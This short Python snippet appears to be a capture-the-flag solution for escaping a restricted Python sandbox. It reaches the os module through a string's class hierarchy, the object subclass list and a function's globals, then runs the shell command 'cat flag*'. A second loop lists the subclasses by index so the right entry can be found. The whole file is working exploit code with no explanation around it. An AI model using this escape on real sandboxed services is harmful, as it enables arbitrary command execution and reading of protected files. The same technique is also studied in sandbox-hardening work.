print(''.__class__.__mro__[1].__subclasses__()[109].__init__.__globals__["sys"].modules["os"].system("cat flag*"))

for i,val in enumerate(''.__class__.__mro__[1].__subclasses__()):
	print(i,': ',val)